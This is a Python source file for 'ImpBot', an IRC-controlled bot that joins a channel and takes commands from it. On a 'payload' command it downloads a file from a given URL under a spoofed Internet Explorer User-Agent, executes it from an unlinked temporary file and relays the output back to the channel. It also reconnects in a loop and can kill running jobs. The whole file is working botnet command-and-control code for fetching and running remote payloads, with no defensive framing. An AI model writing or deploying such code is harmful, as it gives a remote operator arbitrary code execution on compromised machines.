#!/bin/env python
# coding: utf-8

import irc.client
import logging
import multiprocessing
import os
import re
import scapy.all as scapy
import shlex
import socket
import subprocess
import sys
import tempfile
import threading
import time
import urllib.parse
import urllib.request

SERVER = os.environ.get("SERVER")
CHANNEL = os.environ.get("CHANNEL", "#void")
USERNAME = os.environ.get("USERNAME", "imp")
PASSWORD = os.environ.get("PASSWORD", "password")
NICK = os.environ.get("NICK", "imp0")
LOG_LEVEL = os.environ.get('LOG_LEVEL', 'INFO')
QUANTUM = float(os.environ.get("QUANTUM", 0.5))

logging.basicConfig(format="[%(levelname)7s %(asctime)s %(name)s] %(message)s", datefmt="%m-%d %H:%M:%S")
logger = logging.getLogger(NICK)
logger.setLevel(LOG_LEVEL)

socket.setdefaulttimeout(30)

def parse_nick(string):
    masked = irc.client.NickMask(string or '').nick
    if not masked:
        return None
    return masked.lstrip('@')

def urlexec(url, args, stdout=None, stderr=None):
    # Redirect stdout as this is intended to run in a fork.
    sys.stdout = stdout or open(os.devnull, 'w')
    sys.stderr = stderr or sys.stdout
    os.dup2(sys.stdout.fileno(), 1)
    os.dup2(sys.stderr.fileno(), 2)

    req = urllib.request.Request(url=url, headers={
        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)',
    })
    resp = urllib.request.urlopen(req)

    # Make and unlink a temporary file to execute from.
    wr, name = tempfile.mkstemp()
    try:
        rd = open(name, 'rb')
    finally:
        os.unlink(name)

    # Shuttle data into the temp file.
    buf = resp.read(4096)
    while buf:
        os.write(wr, buf)
        buf = resp.read(4096)
    os.close(wr)

    # Execute the program
    arg0 = urllib.parse.urlparse(url).path
    os.chmod(rd.fileno(), 0o700)
    os.execve(rd.fileno(), (arg0,) + args, os.environ)

class ImpBot:
    msgexp = re.compile(r'^\+(?P<nick>\w+),\s*(?P<cmd>\S+)(\s+|$)(?P<args>.*)')

    def __init__(self, server, nick, user=None, password=None, keepalive=30):
        self.server = server
        self.nick = nick
        self.user = user
        self.password = password
        self.keepalive = keepalive
        self.procs = []

        logger.info("connecting with %s %s", USERNAME, PASSWORD)
        addr, port = server
        self.reactor = irc.client.Reactor()
        self.conn = self.reactor.server().connect(addr, port, nickname=nick, username=user, password=password)
        self.conn.set_keepalive(keepalive)
        self.register_handlers()

    def run(self):
        try:
            while True:
                self.reactor.process_once(timeout=QUANTUM)
                if not self.conn.connected:
                    logger.info("quitting: disconnected")
                    break
                self.poll_procs()
        finally:
            self.conn.disconnect()

    def poll_procs(self):
        for proc, pipe in self.procs:
            data = pipe.read()
            if data is not None:
                for line in data.decode().splitlines():
                    line = line.strip()
                    if line:
                        self.conn.privmsg(CHANNEL, f"> {line}")
            if proc.exitcode is not None:
                self.conn.privmsg(CHANNEL, f"done: {proc.exitcode}")
                pipe.close()
        self.procs = [(proc, pipe) for proc, pipe in self.procs if proc.exitcode is None]

    def register_handlers(self):
        for key in dir(self):
            match = re.fullmatch(r'(\w+)_handler', key)
            if match:
                event = match.group(1)
                self.reactor.add_global_handler(event, getattr(self, key))
                logger.debug("registered %s for %s events", key, event)

    def payload(self, args):
        split = shlex.split(args)
        if not split:
            return "where shall I find my payload?"

        url, pargs = split[0], tuple(split[1:])
        try:
            urllib.parse.urlparse(url)
        except ValueError:
            return f"{url} is not a valid URL"

        # Make a pipe to communicate the process results.
        r, w = os.pipe()
        os.set_inheritable(w, True)
        os.set_blocking(r, False)
        recv, send = os.fdopen(r, 'rb'), os.fdopen(w, 'wb')

        try:
            p = multiprocessing.Process(target=urlexec, args=(url, pargs, send))
            p.start()
        except (OSError, multiprocessing.ProcessError) as err:
            return f"failed to start the process: {err!r}"

        self.procs.append((p, recv))
        return "running..."

    def purge(self):
        for proc, _ in self.procs:
            proc.terminate()

    def pubmsg_handler(self, conn, event):
        if not event.target == CHANNEL:
            return

        msg = self.msgexp.match(event.arguments[0])
        if not msg or msg['nick'] != self.nick:
            return

        lord = parse_nick(event.source)
        if msg['cmd'] == 'payload':
            result = self.payload(msg['args'])
            conn.privmsg(CHANNEL, f"{lord}, {result}")
        elif msg['cmd'] == 'purge':
            if self.procs:
                self.purge()
            else:
                conn.privmsg(CHANNEL, f"{lord}, there are no running processes")
        else:
            conn.privmsg(CHANNEL, f"{lord}, '{msg['cmd']}' is unknown to me.")

    def all_events_handler(self, _, event):
        if event.type not in ("all_raw_messages", "motd"):
            logger.info("%s", event)

    def join_handler(self, conn, event):
        if parse_nick(event.source) == self.nick and event.target == CHANNEL:
            conn.privmsg(CHANNEL, "hi, all")

    def welcome_handler(self, conn, _):
        conn.join(CHANNEL)

def main():
    while True:
        try:
            ImpBot((SERVER, 6667), nick=NICK, user=USERNAME, password=PASSWORD).run()
        except (ConnectionError, irc.client.ServerConnectionError, OSError):
            logger.exception("error while running ImpBot")
            time.sleep(10)
        except KeyboardInterrupt:
            logger.info("shutting down: recieved SIGINT")
            break

if __name__ == "__main__":
    main()
